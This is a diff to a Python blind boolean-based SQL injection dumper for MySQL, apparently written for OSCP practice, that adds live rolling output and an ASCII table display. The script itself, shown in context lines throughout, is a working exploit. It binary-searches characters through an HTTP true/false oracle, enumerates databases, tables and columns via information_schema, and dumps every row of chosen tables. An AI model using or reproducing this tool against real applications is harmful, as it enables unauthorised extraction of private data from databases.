@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 # ---------------------------------------------------------------------------
-# Blind boolean-based SQLi dumper (MySQL) - interactive drill-down
+# Blind boolean-based SQLi dumper (MySQL) - interactive, live rolling output
 # Oracle = TRUE/FALSE difference in the HTTP response.
 # Binary search on ASCII per character (~8 requests/char, 0-255 range).
 # Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
+# Values roll in char-by-char (sqlmap style); row data prints as an ASCII table.
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -45,19 +46,21 @@ def extract_char(subquery, pos):
             hi = mid
     return lo
 
-def extract_string(subquery, live=True):
-    """Pull a string one char at a time until a NULL/empty char (value 0) ends it."""
+def extract_string(subquery, label=None):
+    """Pull a string char by char until a NULL/empty char (0) ends it.
+    If label is given, redraw the growing value on one line (rolling output)."""
     out, pos = "", 1
     while True:
         val = extract_char(subquery, pos)
-        if val == 0:              # past end of string -> done
+        if val == 0:                      # past end of string -> done
             break
-        ch = chr(val)
-        out += ch
-        if live:
-            sys.stdout.write(ch)
+        out += chr(val)
+        if label is not None:
+            sys.stdout.write(f"\r{label}{out}")   # \r rewrites the same line
             sys.stdout.flush()
         pos += 1
+    if label is not None:
+        sys.stdout.write("\n")
     return out
 
 def extract_number(subquery):
@@ -73,22 +76,41 @@ def extract_number(subquery):
             hi = mid
     return lo
 
+# --- ASCII table renderer --------------------------------------------------
+def render_table(headers, rows):
+    """Print rows as an aligned ASCII table."""
+    widths = [len(h) for h in headers]
+    for row in rows:
+        for i in range(len(headers)):
+            cell = row[i] if i < len(row) else ""
+            widths[i] = max(widths[i], len(cell))
+    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
+    def fmt(cols):
+        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
+        return "| " + " | ".join(cells) + " |"
+    print("      " + bar)
+    print("      " + fmt(headers))
+    print("      " + bar)
+    for row in rows:
+        print("      " + fmt(row))
+    print("      " + bar)
+
 # --- Enumeration helpers ---------------------------------------------------
 def get_databases():
     q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
-    s = extract_string(q, live=False)
+    s = extract_string(q, label="[*] databases: ")
     return s.split(",") if s else []
 
 def get_tables(db):
     q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
          f"WHERE table_schema='{db}'")
-    s = extract_string(q, live=False)
+    s = extract_string(q, label=f"[*] tables in {db}: ")
     return s.split(",") if s else []
 
 def get_columns(db, table):
     q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
          f"WHERE table_schema='{db}' AND table_name='{table}'")
-    s = extract_string(q, live=False)
+    s = extract_string(q, label=f"[*] columns in {db}.{table}: ")
     return s.split(",") if s else []
 
 def dump_table(db, table):
@@ -99,13 +121,15 @@ def dump_table(db, table):
     # concat_ws joins columns with | ; 0x7c is hex for | (avoids quote issues).
     # Per-row LIMIT avoids group_concat's 1024-byte truncation on big tables.
     col_expr = "concat_ws(0x7c," + ",".join(cols) + ")"
-    rows = extract_number(f"SELECT count(*) FROM {db}.{table}")
-    print(f"      ({rows} row(s), columns: {'|'.join(cols)})")
-    for i in range(rows):
+    rows_n = extract_number(f"SELECT count(*) FROM {db}.{table}")
+    print(f"      ({rows_n} row(s))")
+    data = []
+    for i in range(rows_n):
         row_q = f"SELECT {col_expr} FROM {db}.{table} LIMIT {i},1"
-        sys.stdout.write(f"      [{i}] ")
-        extract_string(row_q, live=True)
-        print()
+        raw = extract_string(row_q, label=f"    row {i}: ")   # live rolling
+        data.append(raw.split("|"))
+    print()
+    render_table(cols, data)                                  # clean summary
 
 # --- Interactive chooser ---------------------------------------------------
 def choose(items, label):
@@ -128,23 +152,18 @@ def main():
     all_dbs = get_databases()
     print(f"[+] Found: {', '.join(all_dbs)}")
 
-    # non-system dbs are the sensible dump candidates; keep system ones selectable
     candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
     chosen_dbs = choose(candidates, "database")
 
     for db in chosen_dbs:
         print(f"\n[DB] {db}")
-        print("[*] Enumerating tables...")
         tables = get_tables(db)
         if not tables:
             print("    (no tables)")
             continue
-        # only prompt per-table when a single DB was chosen; dumping "all DBs"
-        # dumps every table to avoid a prompt storm
+        # only prompt per-table when a single DB was chosen
         if len(chosen_dbs) == 1:
             tables = choose(tables, "table")
-        else:
-            print(f"[+] Tables: {', '.join(tables)}")
 
         for table in tables:
             print(f"  [TABLE] {db}.{table}")
